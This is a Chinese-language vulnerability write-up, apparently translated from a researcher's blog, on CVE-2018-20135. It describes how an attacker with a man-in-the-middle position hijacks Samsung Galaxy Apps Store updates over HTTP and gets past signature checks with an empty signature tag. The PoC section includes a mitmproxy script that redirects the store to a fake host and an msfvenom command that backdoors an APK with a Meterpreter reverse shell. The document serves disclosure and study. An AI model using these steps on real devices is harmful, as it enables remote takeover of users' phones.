***本文仅用于技术讨论和学习目的，切勿用于非法用途。**

 **移动操作系统更新机制对于确保用户信任软件，远离黑客攻击风险来说十分重要。（在本文介绍的漏洞中）攻击者通过拦截三星Galaxy Apps
Store（商店应用）发出的周期更新请求，能够实现未经授权的任意代码注入。**

由于商店应用初始更新检查使用HTTP，攻击者在控制网络流量（例如，在网络上实施中间人攻击）的前提下，可以更改用于负载平衡的URL并修改对镜像的请求至用户所控制的域名。这将允许攻击者欺骗Galaxy
Apps使用任意带有有效SSL证书的主机名，并模拟应用商店API来修改设备上的现有应用。（最重要的是）攻击者可以在三星设备上利用此漏洞实现远程代码执行。

## 1\. 方法概述

### 1.1 查找具有相关权限的应用程序

分析三星移动整个APP生态是一项艰巨的任务，不过搜索具有相关权限（例如能够安装其他应用程序）的APP可以大大减少漏洞搜索量。

采用这种方法，我们开发了一个便捷工具-[Androguard](https://github.com/androguard/androguard)，来转储和枚举所有带有相关权限的应用程序。使用它，我们分析了所有APK并生成了一个备选APP集合。

### 1.2 找到相关攻击面

虽然在没有系统权限的情况下，本地安装应用程序本身就是一个很好的漏洞，但我们设定的目标是检查可以安装其他应用程序的系统应用程序，从而实现一个远程代码执行。

为了进一步减少攻击面，我们假设三星在下载APK时会使用SSL来防止MITM，所以我们编写了一些模块来缩减备选APK集合：

 **1.2.1 传输安全**

我们编译了一个用于发起HTTP/HTTPS请求类和方法的列表，并对照列表检查了所有APP，这又缩小了我们的备选范围。

虽然这种方法会忽略未采用SSL并从不受信任的来源执行不安全安装的应用程序，但我们假设三星至少在执行危险操作时会尝试使用SSL。同时我们在受控环境中拦截网络请求，从而在使用这些应用程序时能够识别HTTP请求。

 **1.2.2 应用签名验证**

许多应用程序使用SSL作为其正常操作的一部分，所以之前框定的范围还是很大，为了进一步减少它，我们过滤了所有包含字符串“signature”的类。

### 1.3 逆向工程

在最终得到的一些备选APP中，我们选择了最可能有程序包安装相关漏洞的应用程序--Galaxy Apps
Store，作为第一个要查看的应用程序。为了方便团队工作和使用IDE，我们使用[JADX](https://github.com/skylot/jadx)来将APK反编译为gradle项目并将其导入Android
Studio，这对于查找类和变量用法等非常有用。

## 2\. 漏洞

### 2.1 传输不安全（HTTP）

Galaxy Apps
Store请求一个countryURL字段来使用。该请求有时具有周期性，也可能是第一次启动应用或是更改MCC（移动国家/地区代码）时。但是，该请求使用的是HTTP而不是HTTPS，这就导致了MITM（中间人）攻击。

在改POST请求中，设备会发送有关设备状态的信息，例如：MCC，MNC，设备型号和语言。在响应中，会返回一个countryURL字段供商店使用。countryURL中包含一个HTTP
URL，但应用程序会在下一个请求中使用HTTPS。

![](https://image.3001.net/images/20190214/15501239271814.png!small)

图1：HTTP请求

![](https://image.3001.net/images/20190214/15501239412932.png!small)

图2：HTTP响应

攻击者可能拦截网络上的流量，恶意更改请求响应中的countryURL字段。由攻击者控制的虚假countryURL可以充当实际API的代理并动态更改多个信息，例如应用程序名称，图像，权限等。

![](https://image.3001.net/images/20190214/15501239556273.png!small)

### 2.2 签名验证

此时我们的目标是通过在设备上安装任意应用程序来实现RCE。我们分析了更新或安装应用程序的请求，意识到可以修改APK文件的URL。虽然原始服务器返回的XML中有一个签名参数，但是我们能够设法绕过此验证。

当用户想要安装或更新应用程序时，商店会请求有关该应用程序的信息。（服务器）返回一个XML，其中包含的信息有权限、APK大小、下载地址和签名信息：

    
    
    <？xml version = “ 1.0 ” encoding = “ UTF-8 ” standalone = “ yes ”？>
    < SamsungProtocol  version = “ 5.5 ” >
    ...
    < value  name = “ contentsSize ” > 72351744 </ value > < value  name = “ installSize ” > 94371840 </ value >
    < value  name = “ signature ” > a0ce9d124dbc9a39f978f455255355684cc78881 </ value >
    < value  name = “ downloadUri ” > https://samsappsbn.vo.llnwd.net/astore_bin/fapbeixk0j/2018/1220/7d1791d56d.apk </ value >
    ...
    </ SamsungProtocol >

首先，我们尝试将downloadUri更改为我们控制的其他APK（内置反弹shell），但由于签名值问题，Store客户端并不接受它。继续尝试在XML中删除签名标记，也报错了。最后发现，如果将签名标签置空而非删除（即<value
name="signature"></value>），签名会被接受，使得修改APK安装成功。

## 3\. PoC

为了简化我们的PoC，我们使用[mitmproxy](https://mitmproxy.org/)来拦截和修改请求。我们编写了一个脚本来自动篡改脆弱的HTTP响应并提供假服务感染客户端：

    
    
    import re
    SERVER = b"fakegalaxystore.com"
    
    def response(flow):
        s = flow.response.content
        m = re.match(b"http:\/\/[a-z]+-odc\.samsungapps\.com", s)
        if m:
            s = s.replace(m.group(0), SERVER)
            flow.response.content = s
            print("#### %s" % s)
    ...

一旦客户端被感染并开始使用虚假的URL，应用程序便可能尝试更新，而虚假商店服务可以告诉客户端指定应用程序有新的更新。当客户端想要安装或更新指定应用程序时，攻击者服务器可以将下载URI替换为后门APK文件链接，使其安装在具有额外权限的设备上。由于签名字段缺乏验证（如果XML标签值存在但为空，设备会不经验证地接受来自商店的APK），所以在从商店下载任意不校验签名的APP时，可以动态修改和感染所请求的APK。正如PoC中的流程，当客户端请求APK时，他们便会会被下载，存储和添加后门（使用[msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)）：

`msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST=X.X.X.X
LPORT=4444 -o backdoor.apk`

利用此漏洞的服务如下所示：

![](https://image.3001.net/images/20190214/15501240235324.png!small)

## 4\. 结论

商店应用是具有INSTALL权限的特权应用程序，允许攻击者修改清单以添加比应用程序向用户显示的更多权限。因为可以在服务器响应中修改权限列表，所以用户不会意识到所安装的APP将拥有比安装菜单上显示的更多的权限。

整个利用过程大体是这样的：首先通过MITM在设备中植入虚假商店API
URL，然后动态地给应用程序添加后门并绕过签名机制，从而安装自定义的应用程序，最后实现在使用Galaxy Apps
Store的设备上执行任意代码（RCE）。

受影响的版本：Samsung Apps Store <4.3.01.7

通过测试的三星设备：A5 2017（A520），Note 8（N950F），A8 2018（A530F），S7（G930F），XCover
4（G390F），S8（G950F），S8 Plus（G955F），J7 2017（J730F）

### 漏洞时间线：

> 30/05/2018 - 向Samsung Bug Bounty program报告
>
> 30/05/2018 - 漏洞定级（严重程度：高）
>
> 27/09/2018 - 修正（Galaxy Apps Store 4.3.01.7 发布）
>
> 16/10/2018 - 得到赏金奖励
>
> 13/12/2018 - 创建CVE条目<https://cve.mitre.org/cgi-> bin/cvename.cgi?name=CVE-2018-20135>

 ***参考来源：[adyta](https://www.adyta.pt/en/2019/01/29/writeup-samsung-app-store-rce-via-mitm-2)，柏浮锋编译整理，转载请注明来自 FreeBuf.COM。**

